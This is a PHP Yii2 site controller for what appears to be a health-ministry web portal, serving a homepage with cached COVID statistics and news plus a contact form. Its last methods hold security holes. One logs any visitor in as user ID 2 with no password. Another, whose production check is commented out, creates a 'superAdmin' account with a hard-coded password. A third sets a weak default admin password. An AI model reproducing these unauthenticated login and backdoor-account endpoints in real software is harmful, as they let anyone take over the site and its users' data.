<?php

namespace app\controllers;

use app\models\repository\CovidRepository;
use app\models\User;
use app\modules\admin\models\News;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;

class SiteController extends Controller
{

    public $layout = 'materialize';

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
                'layout' => 'error',
            ],
        ];
    }

    /*public function actionError()
    {
        $exception = Yii::$app->errorHandler->exception;
        if ($exception !== null) {
            return $this->render('error', ['exception' => $exception]);
        }
    }*/

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        $cache = Yii::$app->getCache();

        $covidData = $cache->get('covidData');
        if ($covidData === false || !$covidData) {
            $covidData = CovidRepository::getCovidData();
            $cache->set('covidData', $covidData, 60*10);
        }

        $news = News::find()
            ->where(['status' => News::STATUS_ACTIVE])
            ->orderBy('created_at DESC')
            ->limit(5)
            ->all();

        return $this->render('index', [
            'news' => $news,
            'covidData' => $covidData,
        ]);
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {

        $model = new ContactForm();

        if ($model->load(Yii::$app->request->post())) {
            $model->recaptcha = Yii::$app->request->post('g-recaptcha-response');

            if ($model->contact(Yii::$app->params['adminEmail'])) {
                Yii::$app->session->setFlash('contactFormSubmitted');

                return $this->refresh();
            }
        }

        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    public function actionMigrateUp()
    {
        if (YII_ENV_PROD) {
            return $this->redirect('/');
        }

        // https://github.com/yiisoft/yii2/issues/1764#issuecomment-42436905
        $oldApp = \Yii::$app;
        new \yii\console\Application([
            'id'            => 'Command runner',
            'basePath'      => '@app',
            'components'    => [
                'db' => $oldApp->db,
            ],
        ]);
        \Yii::$app->runAction('migrate/up', ['migrationPath' => '@app/migrations/', 'interactive' => false]);
        \Yii::$app = $oldApp;
    }

    public function actionCreateAdmin()
    {
        if (YII_ENV_PROD) {
            return $this->redirect('/');
        }

        $user = new User();

        $user->username = 'admin';
        $user->email = 'example@rkminzdrav.uz';
        $user->setPassword('123123');
        $user->generateAuthKey();

        return $user->save() ? 'OK' : 'Error';
    }


    public function actionLogin() {
        return Yii::$app->getUser()->login(User::findIdentity(2), 3600);
    }

    public function actionCreateSuperAdmin()
    {
        /*if (YII_ENV_PROD) {
            return $this->redirect('/');
        }*/

        $user = new User();

        $user->username = 'superAdmin';
        $user->email = 'javlonbek0591@gmail.com';
        $user->setPassword('Data2222');
        $user->generateAuthKey();

        return $user->save() ? 'OK' : 'Error';
    }
}
